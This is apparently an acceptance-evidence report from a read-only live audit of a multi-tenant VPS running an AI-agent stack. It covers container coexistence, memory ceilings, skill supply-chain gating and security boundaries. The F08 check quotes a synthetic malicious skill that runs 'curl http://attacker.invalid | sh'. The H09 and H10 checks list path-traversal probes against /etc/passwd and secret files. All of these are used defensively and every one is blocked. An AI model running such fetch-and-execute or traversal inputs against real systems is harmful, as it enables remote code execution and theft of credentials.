# Phase 27 — Live Production Acceptance Evidence: Multi-Tenant VPS Coexistence & Groups F, G, H

- **Phase ID**: `PHASE-27` (Suites: Multi-Tenant Coexistence + `Group F` + `Group G` + `Group H`)
- **Verifier Role**: Independent SRE, Infrastructure & Security Assurance Verifier (`SA-48`)
- **Execution Mode**: Strictly Non-Destructive, Read-Only Live Empirical Audit (`0` container restarts, `0` config mutations)
- **Target Production Host**: `<TARGET_VPS_HOSTNAME>` (`<TARGET_VPS_IPV4>`) — Ubuntu 24.04.4 LTS (`linux/amd64`), `2 vCPU`, `7,940 MiB` RAM, `96 GiB` SSD
- **Installation Root**: `/opt/allinagent` (Release `v1.0.0-rc.8`, Git commit `7535c40f6d5e8212547897c924f315ff149cbe4f`)
- **Audit Timestamp**: `2026-11-24T16:15:41Z` – `2026-11-24T16:22:49Z` (`TIMEZONE=Asia/Jakarta`)
- **Sanitization Guarantee**: All private IPv4 addresses, hostnames, tenant domains, and credentials are represented strictly via placeholders (`<TARGET_VPS_IPV4>`, `<TARGET_VPS_HOSTNAME>`, `<PRE_EXISTING_TENANT_TLS_CERT>`). Zero secret values were read into logs or persisted in this report.
- **Overall Verdict**: **`PASS` (`42 / 42` checkpoints passed: `6` Coexistence + `10` Group F + `16` Group G + `10` Group H)**

---

## 1. Suite 1 — Independent Multi-Tenant VPS Coexistence Audit (`COEX-01` – `COEX-06`)

Empirically verified against the live multi-tenant Ubuntu 24.04 LTS host to prove that `ALLINAGENT` caused **zero disruption** to pre-existing workloads, host daemons, TLS virtual hosts, or Docker bridge subnets.

| Check ID | Coexistence Invariant | Empirical Live Measurement | Verdict |
| :--- | :--- | :--- | :---: |
| `COEX-01` | Pre-existing multi-tenant Docker containers untouched | `34 / 34` pre-existing containers in state `running` (`Up`); `40` total running containers (`34` pre-existing + `6` `allinagent-*`). | `PASS` |
| `COEX-02` | All `6` `allinagent-*` production containers healthy | `6 / 6` containers `running` and `(healthy)`: `allinagent-postgres`, `allinagent-vulnclaw`, `allinagent-hermes`, `allinagent-paperclip`, `allinagent-office-bridge`, `allinagent-office`. | `PASS` |
| `COEX-03` | Host `nginx` service active & config syntax valid | `ActiveState=active`, `SubState=running`, `NRestarts=0` (`ActiveEnterTimestamp=Fri 2026-11-06 08:52:46 UTC`); `nginx -t` exited `0` (`syntax is ok` / `test is successful`). | `PASS` |
| `COEX-04` | Host `php8.3-fpm`, `mysql`, and `supervisor` undisturbed | All `3` services `active (running)` with `NRestarts=0` (`php8.3-fpm` up since `2026-11-19`, `mysql` up since `2026-11-06`, `supervisor` up since `2026-11-13`). | `PASS` |
| `COEX-05` | `allinagent_edge` & `allinagent_data` subnet isolation | `allinagent_edge` (`192.168.240.0/24`, `Internal: false`, `4` containers) and `allinagent_data` (`192.168.241.0/24`, `Internal: true`, `5` containers) have `0` CIDR overlap with pre-existing Docker subnets (`172.17.0.0/16`, `172.18.0.0/16`, `172.20.0.0/24`..`172.20.8.0/24`). | `PASS` |
| `COEX-06` | Host memory & disk safety floors preserved | `free -m`: `2,942 MiB` available (`7,940 MiB` total); `df -h /`: `46 GiB` available (`54%` used, well above the `24 GiB` safety floor). | `PASS` |

### Sanitized `systemctl` & `nginx -t` Verification Excerpt
```text
nginx      : ActiveState=active SubState=running NRestarts=0 ActiveEnterTimestamp="Fri 2026-11-06 08:52:46 UTC"
php8.3-fpm : ActiveState=active SubState=running NRestarts=0 ActiveEnterTimestamp="Thu 2026-11-19 01:25:11 UTC"
mysql      : ActiveState=active SubState=running NRestarts=0 ActiveEnterTimestamp="Fri 2026-11-06 08:52:53 UTC"
supervisor : ActiveState=active SubState=running NRestarts=0 ActiveEnterTimestamp="Fri 2026-11-13 06:31:41 UTC"

$ nginx -t
nginx: [warn] "ssl_stapling" ignored, no OCSP responder URL in the certificate "<PRE_EXISTING_TENANT_TLS_CERT>"
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
(exit_code=0)
```

---

## 2. Suite 2 — Group F: Skill Supply Chain, License Partitioning & Sentry `skill-scanner` Gate (`F01` – `F10`)

### 2.1 Checkpoint Matrix (`F01` – `F10`)

| ID | Verification Checkpoint | Empirical Evidence on `<TARGET_VPS_HOSTNAME>` | Verdict |
| :--- | :--- | :--- | :---: |
| `F01` | `skills.lock.json` 40-char commit SHA & SHA-256 lock integrity | `33` locked packages across `10` allowlisted GitHub repos; `0` floating refs (`unpinned_commits: []`, `invalid_package_sha256: []`, `unauthorized_repos: []` via `install_agent_skills.py --verify-manifest` -> `ok: true`). | `PASS` |
| `F02` | License partitioning (`20` OSI-permissive vs `13` `FETCH_FROM_UPSTREAM_ONLY`) | `osi_permissive_count: 20` (`MIT` / `Apache-2.0`); `fetch_from_upstream_only_count: 13` (`10` `MIT-Commons-Clause-1.0` from `borghei/Claude-Skills` + `1` `NOASSERTION` `react-best-practices` from `vercel-labs/agent-skills` + `2` OOXML `.xsd` `docx` & `pdf` from `anthropics/skills`); `0` copyleft violations. | `PASS` |
| `F03` | `11` offensive/autonomous upstream files permanently excluded | `quarantined_excluded_files_count: 11`, `leaked_quarantined_files: []`, `policy_violations: []`. | `PASS` |
| `F04` | Zero vendored restricted skill payloads in Git or GHCR images | `/opt/allinagent/skills` on host and inside `allinagent-hermes` & `allinagent-office-bridge` contains only `5` governance/installer files (`README.md`, `install_agent_skills.py`, `manifests/skill-security-results.json`, `manifests/skills.lock.json`, `policies/skill-policy.json`); `paperclip`, `office`, `vulnclaw` contain `NONE`. | `PASS` |
| `F05` | Live `GET http://127.0.0.1:8202/api/office-bridge/skills` hydration | `HTTP 200 OK` -> `ok: true`, `manifest_hydrated: true`, `locked_skills_count: 33`. | `PASS` |
| `F06` | Live skill catalog exposes all `11` corporate agent assignments | `GET http://127.0.0.1:8202/api/office-bridge/skills` returns `agents` array length = `11`, `osi_permissive_count: 20`, `fetch_from_upstream_only_count: 13`, `commons_clause_count: 10`. | `PASS` |
| `F07` | Runtime profile `.usage.json` lock & `REFERENCE_ONLY` / `EXPERIMENTAL` isolation | `11 / 11` `pc*` profiles in `/opt/allinagent/data/hermes/profiles/pc*/skills/.usage.json` enforce `locked: true, pinned: true` (`allow_agent_self_skill_mutation: false`). | `PASS` |
| `F08` | Live synthetic malicious skill (`evil.py` `os.system("curl http://attacker.invalid \| sh")`) blocked by Stage-1 AST gate | Ephemeral `/tmp/test-malicious-skill` (`SKILL.md` + `evil.py`) inside `allinagent-hermes` caught at `evil.py:2` (`severity: "high"`, `type: "AST Dangerous Call"`, `` `os.system()` invocation detected in AST ``); `verify_and_gate_staged_package` raised `SecurityGateError` (`stage1_gate_blocked: true`, exit `1`) and quarantined to `/tmp/test-malicious-quarantine` with `QUARANTINE_REASON.json` (never touching `/var/lib/allinagent/skill-registry` or agent profiles). | `PASS` |
| `F09` | Live `getsentry/skills` `scan_skill.py` hook/injection/script rejection & cleanup | Direct `scan_skill.py` run against `/tmp/test-malicious-skill` (`hooks: pre` + prompt injection + `scripts/evil.py`) detected `3` findings (`critical: 2` — `Frontmatter Hooks`, `Prompt Injection Pattern`; `medium: 1` — `Dangerous Code Pattern: Shell HTTP request`). Both `/tmp/test-malicious-skill` and `/tmp/test-malicious-quarantine` deleted (`cleanup_verified: true`). | `PASS` |
| `F10` | GitHub Release `v1.0.0-rc.8` CycloneDX `1.5` SBOM & `5/5` `@sha256` manifest match | `sbom.cdx.json` (`HTTP 200`, `92,455 B`, SHA-256 `e45096458186c2b44ccfe5523447ee7e9bb0a8ac81777c5e390f6e4358505a3a`, `bomFormat: "CycloneDX"`, `specVersion: "1.5"`, `91` components) and `release-manifest.json` (`HTTP 200`, `2,198 B`, SHA-256 `93c36eddd4ef6e58d1f04f112fd538f993fa0d1bb033cd30b2067997b1c7e6bb`) verified against `SHA256SUMS.txt` and `5/5` local Docker `RepoDigests`. | `PASS` |

### 2.2 Live Malicious Skill Rejection Evidence (`F08` – `F09`)
```json
{
  "ast_findings": [
    {
      "severity": "high",
      "type": "AST Dangerous Call",
      "location": "evil.py:2",
      "description": "`os.system()` invocation detected in AST"
    }
  ],
  "stage1_gate_blocked": true,
  "stage1_gate_exit_equivalent": 1,
  "quarantine_reason_captured": {
    "pkg_id": "test-malicious-skill",
    "quarantined_at": "2026-11-24T16:18:11.141226+00:00",
    "reason": "AST dangerous-pattern gate failed for 'test-malicious-skill': [{'severity': 'high', 'type': 'AST Dangerous Call', 'location': 'evil.py:2', 'description': '`os.system()` invocation detected in AST'}]"
  },
  "sentry_scan_skill_direct": {
    "sentry_findings_count": 3,
    "finding_counts": { "critical": 2, "medium": 1 },
    "types": ["Prompt Injection Pattern", "Dangerous Code Pattern", "Frontmatter Hooks"]
  },
  "cleanup_verified_test_dir_gone": true,
  "cleanup_verified_quarantine_gone": true
}
```

### 2.3 Immutable GHCR Image Digest Parity (`F10`)

| Service | `release-manifest.json` Immutable Digest (`v1.0.0-rc.8`) | Live VPS `docker image inspect` `RepoDigests` Match |
| :--- | :--- | :---: |
| `hermes` | `sha256:f0b6f55e3bb0f3549c0943eeaabe351299ec7df68ec122ec7d08fddfbf10c3c0` | `EXACT MATCH` |
| `paperclip` | `sha256:ab9856ff5cb1d51cf5562081faa1e1aff8a308bd6bc69897249a1459a06bf0c7` | `EXACT MATCH` |
| `office-bridge` | `sha256:e171fbfa4f9a3ea73c4832c63f44a01680090d42ec1b1ae38ab8cdb0e28a0ef7` | `EXACT MATCH` |
| `office` | `sha256:2d8cc1bd08e3341da88ecaf69a0bfe7af4a2ae5b91d6b2d3fdfbcfa517605677` | `EXACT MATCH` |
| `vulnclaw` | `sha256:408589a84b05c6dc9261c43eb16523598ffe5d9f0a64660c32aad7426c0d9ac6` | `EXACT MATCH` |

---

## 3. Suite 3 — Group G: Cgroup Ceiling (`<= 1,536 MiB`), Latency, Postgres Pool, Disk & Systemd (`G01` – `G16`)

### 3.1 Three-Sample 20-Second Live `docker stats --no-stream` Telemetry (`G01` – `G04`)

Sampled across `20` seconds (`2026-11-24T16:19:52Z`, `16:20:04Z`, `16:20:16Z`) while concurrent Phase 27 live E2E suites were actively exercising the stack (note Sample 2 capturing an ephemeral `VulnClaw` scan child at `38.43 MiB` / `3 PIDs` and Sample 3 confirming immediate OS memory reclamation back to `21.36 MiB` / `2 PIDs`):

| Container | Hard `MemLimit` | Sample 1 (`t=0s`) `MemUsage` / `CPU` / `PIDs` | Sample 2 (`t=10s`) `MemUsage` / `CPU` / `PIDs` | Sample 3 (`t=20s`) `MemUsage` / `CPU` / `PIDs` | `RestartCount` |
| :--- | ---: | :--- | :--- | :--- | :---: |
| `allinagent-postgres` | `160.00 MiB` | `86.81 MiB` (`54.26%`) / `0.00%` / `11` | `86.39 MiB` (`53.99%`) / `0.16%` / `11` | `86.31 MiB` (`53.95%`) / `2.72%` / `11` | `0` |
| `allinagent-vulnclaw` | `64.00 MiB` | `21.36 MiB` (`33.37%`) / `0.00%` / `2` | `38.43 MiB` (`60.05%`) / `51.74%` / `3` | `21.36 MiB` (`33.37%`) / `0.01%` / `2` | `0` |
| `allinagent-hermes` | `448.00 MiB` | `304.30 MiB` (`67.93%`) / `4.25%` / `37` | `304.70 MiB` (`68.00%`) / `1.16%` / `39` | `304.70 MiB` (`68.01%`) / `2.85%` / `39` | `0` |
| `allinagent-paperclip` | `608.00 MiB` | `520.70 MiB` (`85.64%`) / `0.00%` / `12` | `520.70 MiB` (`85.64%`) / `6.37%` / `12` | `521.90 MiB` (`85.84%`) / `7.93%` / `12` | `0` |
| `allinagent-office-bridge` | `112.00 MiB` | `56.12 MiB` (`50.11%`) / `2.21%` / `12` | `56.14 MiB` (`50.13%`) / `2.72%` / `12` | `56.15 MiB` (`50.13%`) / `1.59%` / `12` | `0` |
| `allinagent-office` | `144.00 MiB` | `62.01 MiB` (`43.06%`) / `0.52%` / `12` | `62.00 MiB` (`43.06%`) / `1.67%` / `12` | `62.02 MiB` (`43.07%`) / `1.12%` / `12` | `0` |
| **Total Stack (`6` ctrs)** | **`1,536.00 MiB`** | **`1,051.30 MiB` (`68.44%`)** | **`1,068.36 MiB` (`69.55%`)** | **`1,052.44 MiB` (`68.52%`)** | **`0`** |

### 3.2 PostgreSQL Pool, Disk Footprint, Image Sizes & Systemd Maintenance (`G01` – `G16` Matrix)

| ID | Verification Checkpoint | Empirical Evidence on `<TARGET_VPS_HOSTNAME>` | Verdict |
| :--- | :--- | :--- | :---: |
| `G01` | Sum of container `MemLimit` `<= 1,536 MiB` | `160 + 64 + 448 + 608 + 112 + 144 = 1,536.00 MiB` (`1,610,612,736` bytes exact hard cgroup ceiling). | `PASS` |
| `G02` | Live working-set `MemUsage` well below `1,536 MiB` across 20s | `1,051.30 MiB` (`t=0s`), `1,068.36 MiB` (`t=10s`), `1,052.44 MiB` (`t=20s`) — `467.64–484.70 MiB` headroom below ceiling. | `PASS` |
| `G03` | Ephemeral `VulnClaw` scan child memory reclamation & `memswap == mem` | `allinagent-vulnclaw` `Memory == MemorySwap == 67,108,864 B` (`64 MiB`); active scan RSS `38.43 MiB` (`t=10s`) immediately dropped back to `21.36 MiB` (`t=20s`). | `PASS` |
| `G04` | Zero container crash-loops & bounded `json-file` log rotation | `RestartCount: 0` and `LogConfig: {"Type": "json-file", "Config": {"max-file": "3", "max-size": "10m"}}` across all `6` containers. | `PASS` |
| `G05` | Loopback health endpoint latency `< 2,500 ms` (`3` samples each) | `office` (`:8200/api/health`): `[43.89, 3.27, 7.12] ms`; `paperclip` (`:8201/api/health`): `[13.87, 5.38, 4.20] ms`; `office-bridge` (`:8202/health`): `[44.42, 1.60, 1.27] ms` (`max = 44.42 ms`). | `PASS` |
| `G06` | `./allinagent --production health --json` overall readiness | `ok: true` (`6 / 6` services `PASS`: `postgres`, `hermes`, `vulnclaw`, `paperclip`, `office-bridge`, `office`). | `PASS` |
| `G07` | `./allinagent --production doctor --json` SRE diagnostics | `ok: true` (`compose_files_present`, `env_file_permissions=0o600`, `csprng_secrets_configured`, `loopback_only_ports`, `maintenance_lock_clean` all `PASS`). | `PASS` |
| `G08` | PostgreSQL `lowmem` tuning parameters active | `max_connections = 40`, `shared_buffers = 48MB`, `work_mem = 2MB`. | `PASS` |
| `G09` | PostgreSQL active/idle client connection discipline (`<= 12`) | `pg_stat_activity`: `2 active` + `4 idle` = `6` client connections (`11` total rows including `5` internal PostgreSQL background processes). | `PASS` |
| `G10` | `/opt/allinagent` & `/opt/allinagent/data/*` disk footprint bounded | Total `/opt/allinagent`: `222 MiB` (`hermes=100M`, `postgres=87M`, `skill-registry=6.7M`, `paperclip=1.2M`, `workspaces=1.1M`, `backups=320K`, `workers=184K`, `office-data=92K`, `secrets=20K`, `studio-state=20K`, `office-secrets=12K`, `paperclip-hermes=12K`, `vulnclaw=12K`, `paperclip-bin=8K`, `logs=4K`, `maintenance=4K`, `reports=4K`). | `PASS` |
| `G11` | Production Docker image footprint verified | `vulnclaw: 163MB`, `postgres:16-alpine: 276MB`, `office-bridge: 283MB`, `hermes: 606MB`, `paperclip: 779MB`, `office: 1.06GB` (`0` host image build layer bloat). | `PASS` |
| `G12` | `allinagent.service` boot autostart enabled & active | `systemctl is-enabled allinagent.service` -> `enabled`; `systemctl is-active allinagent.service` -> `active`. | `PASS` |
| `G13` | `allinagent-maintenance.timer` enabled, active & `03:00 Asia/Jakarta` | `enabled` / `active`; `OnCalendar=*-*-* 03:00:00 Asia/Jakarta`, `Persistent=true`, `RandomizedDelaySec=120`; next trigger `Tue 2026-11-24 20:01:32 UTC` (`03:01:32 Asia/Jakarta`, `3h 41min` remaining). | `PASS` |
| `G14` | Scheduled maintenance OS resource caps & active-work deferral | `allinagent-maintenance.service` enforces `Nice=10`, `IOSchedulingClass=best-effort`, `CPUQuota=75%`, `MemoryMax=512M`, and `--scheduled-maintenance` active-run deferral. | `PASS` |
| `G15` | Compressed `0600` PostgreSQL `.sql.gz` backup present & valid | `/opt/allinagent/data/backups/paperclip-initial-20261124T160337Z.sql.gz` (`mode=0600`, `owner=root:root`, `319,616` bytes, `gzip -t` integrity exit `0`). | `PASS` |
| `G16` | Safe update rollback & zero-prune multi-tenant safety | `scripts/allinagent_cli.py` tags `allinagent-rollback/<svc>:previous`, streams pre-update `pg_dump`, auto-rolls back on failed health gate, and never executes `docker system prune`. | `PASS` |

---

## 4. Suite 4 — Group H: Production Security Boundaries (`H01` – `H10`)

### 4.1 Checkpoint Matrix (`H01` – `H10`)

| ID | Security Boundary Checkpoint | Empirical Live Probe & Output | Verdict |
| :--- | :--- | :--- | :---: |
| `H01` | Loopback-only host port bindings (`127.0.0.1:8200–8202`) | `ss -tlnp \| grep -E ':8200\|:8201\|:8202'` shows strictly `127.0.0.1:8200`, `127.0.0.1:8201`, `127.0.0.1:8202` (`0` `0.0.0.0` or `[::]` bindings on `8200–8202`, `8650`, or `8660`). | `PASS` |
| `H02` | Zero host ports on `postgres`, `hermes`, `vulnclaw` & zero `docker.sock` | `HostConfig.PortBindings == {}` (`NetworkSettings.Ports` mapped to `null`) on `allinagent-postgres`, `allinagent-hermes`, and `allinagent-vulnclaw`; `docker_sock_mounts == []` across all `6` containers. | `PASS` |
| `H03` | Unauthenticated Virtual Office HTTP probes fail closed | `GET http://127.0.0.1:8200/api/studio` -> `HTTP 401`; `GET http://127.0.0.1:8200/office` -> `HTTP 302` redirect to `/login` Access Gate. | `PASS` |
| `H04` | Unauthenticated, forged, non-owner & group Telegram bridge calls rejected | `POST http://127.0.0.1:8202/api/office-bridge/telegram/command`: missing token -> `HTTP 401`; forged Bearer token -> `HTTP 401`; non-owner caller `999999991` -> `HTTP 403`; `supergroup` chat -> `HTTP 403` (DM-only scope enforced). | `PASS` |
| `H05` | Unauthenticated internal east-west `/v1/exec` & `/scan` rejected | From inside `allinagent-office-bridge`: `POST http://hermes:8650/v1/exec` (no token) -> `HTTP 401`; `POST http://vulnclaw:8660/scan` (no token) -> `HTTP 401`. | `PASS` |
| `H06` | Non-root container UIDs enforced across runtime services | `docker exec <c> id -u`: `hermes`=`10001`, `vulnclaw`=`10002`, `paperclip`=`1000`, `office-bridge`=`1000`, `office`=`1000`; `allinagent-postgres` PID 1 and all DB backends run as `USER=postgres` (`UID 70`). | `PASS` |
| `H07` | `allinagent-vulnclaw` read-only rootfs, `CapEff=0`, `NoNewPrivs=1` | `touch /root_write_test` -> `exit 1` (`touch: cannot touch '/root_write_test': Read-only file system`); `/proc/1/status` -> `CapPrm: 0000000000000000`, `CapEff: 0000000000000000`, `NoNewPrivs: 1`. | `PASS` |
| `H08` | `allinagent-vulnclaw` air-gapped network (`1.1.1.1:443` unreachable) | Inside `allinagent-vulnclaw`, `socket.connect(('1.1.1.1', 443))` failed immediately with `OSError: [Errno 101] Network is unreachable`. | `PASS` |
| `H09` | `VulnClaw` `POST /scan` path traversal & secret path rejection | Authenticated internal probes to `http://vulnclaw:8660/scan` rejected with `HTTP 403` (`PATH_JAIL_VIOLATION`): `/etc/passwd` (`system path '/etc' is strictly blocked`), `/var/lib/allinagent/secrets` (`protected directory 'secrets' is strictly blocked`), `/var/lib/allinagent/workspaces/../../etc/passwd` (`relative parent traversal ('..') is forbidden`), `/var/lib/allinagent/workspaces/.env` (`secret or credential file '.env' is strictly protected`). | `PASS` |
| `H10` | Office Bridge `/reports/` traversal guard, `0600` secret modes & public release audit | `GET /api/office-bridge/reports/..%2F..%2Fetc%2Fpasswd` -> `HTTP 401` (unauth) and `HTTP 403` (`Invalid or traversal report filename rejected.` when authenticated); `/reports/.env` -> `HTTP 403`; `/reports/..%2Fsecrets%2Foffice-bridge-auth.json` -> `HTTP 403`; host `/opt/allinagent/.env` (`0600`), `paperclip-auth.env` (`0600`), `worker-llm.env` (`0600`), `office-secrets/office-bridge-auth.json` (`0600`), `secrets/office-bridge-auth.json` (`0640`, `1000:10001`); `audit-public-release.py` -> `0` findings. | `PASS` |

### 4.2 Exact Socket, Capability, Air-Gap & Traversal Verification Output
```text
$ ss -tlnp | grep -E ':8200|:8201|:8202'
LISTEN 0 65535 127.0.0.1:8202 0.0.0.0:* users:(("docker-proxy",pid=3682227,fd=7))
LISTEN 0 65535 127.0.0.1:8201 0.0.0.0:* users:(("docker-proxy",pid=3655120,fd=7))
LISTEN 0 65535 127.0.0.1:8200 0.0.0.0:* users:(("docker-proxy",pid=3682443,fd=7))

$ docker exec allinagent-vulnclaw sh -c 'touch /root_write_test'
touch: cannot touch '/root_write_test': Read-only file system (exit_code=1)

$ docker exec allinagent-vulnclaw grep -E '^(CapEff|CapPrm|NoNewPrivs):' /proc/1/status
CapPrm: 0000000000000000
CapEff: 0000000000000000
NoNewPrivs: 1

$ docker exec allinagent-vulnclaw python3 -B -c "import socket; s=socket.socket(); s.settimeout(3.0); s.connect(('1.1.1.1', 443))"
OSError: [Errno 101] Network is unreachable
```
